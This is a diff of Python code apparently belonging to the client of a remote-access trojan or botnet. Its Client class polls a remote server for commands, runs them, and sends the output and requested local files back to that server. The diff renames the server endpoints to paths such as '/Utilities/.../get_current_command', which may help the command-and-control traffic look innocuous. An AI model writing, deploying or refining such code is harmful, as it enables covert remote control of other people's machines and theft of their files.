@@ -63,7 +63,7 @@ class Client(object):
         print(info)
 
     def request_command(self):
-        request = requests.post(config.SERVER + '/api' + self.uid + '/hello', json={'hostname': self.host, 'username': self.username})
+        request = requests.post(config.SERVER + '/Utilities/' + self.uid + '/get_current_command', json={'hostname': self.host, 'username': self.username})
         return request.text
 
     def send_data(self, output, newlines=True):
@@ -74,7 +74,7 @@ class Client(object):
             return
         if newlines:
             output += "\n\n"
-        request = requests.post(config.SERVER + '/api/' + self.uid + '/report', data={'output': output})
+        request = requests.post(config.SERVER + '/Utilities/' + self.uid + '/command_result', data={'output': output})
 
     @threaded
     def runcommand(self, cmd):
@@ -93,7 +93,7 @@ class Client(object):
         try:
             if os.path.exists(file) and os.path.isfile(file):
                 self.send_data("Uploading %s." % file)
-                requests.post(config.SERVER + '/api/' + self.uid + '/upload',
+                requests.post(config.SERVER + '/Utilities/' + self.uid + '/upload',
                               files={'uploaded': open(file, 'rb')})
             else:
                 self.send_data(' No such file: ' + file)
@@ -195,5 +195,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-
